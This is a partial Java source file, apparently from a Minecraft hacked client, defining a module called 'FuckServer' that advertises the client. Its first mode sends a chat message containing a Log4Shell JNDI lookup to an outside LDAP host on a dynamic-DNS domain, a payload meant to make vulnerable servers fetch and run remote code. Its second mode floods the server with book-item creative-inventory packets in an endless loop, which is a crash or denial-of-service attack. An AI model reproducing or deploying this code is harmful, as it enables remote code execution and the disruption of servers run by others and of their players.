...
public class FuckServer extends Module {
    public static Mode<Enum> mode = new Mode("Mode", "mode", FuckServerMods.values(), FuckServerMods.Packet1);
    public FuckServer() {
        ...
        public void run() {
            if(FuckServer.mode.getValue() == FuckServerMods.Packet1){
                ...
                try {
                    ...
                    final String author = "Bape User" + Math.random() * 114514.1919810;
                    final String title = "Get Good Get Bape --> www.bapeclient.xyz <-- Get Good Get Bape" + Math.random() * 114514.1919810;
                ...
                mc.thePlayer.sendChatMessage("${jndi:ldap://zhou2008.dd-dns.de:8849/Test}");
            } else if (FuckServer.mode.getValue() == FuckServerMods.Packet2) {
                final ItemStack bookObj = new ItemStack(Items.writable_book);
                final NBTTagList list = new NBTTagList();
                final NBTTagCompound tag = new NBTTagCompound();
                final String author = "RickAstley";
                ...
                while (true) {
                    mc.getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(36, bookObj));
                    try {
                        Thread.sleep(12L);
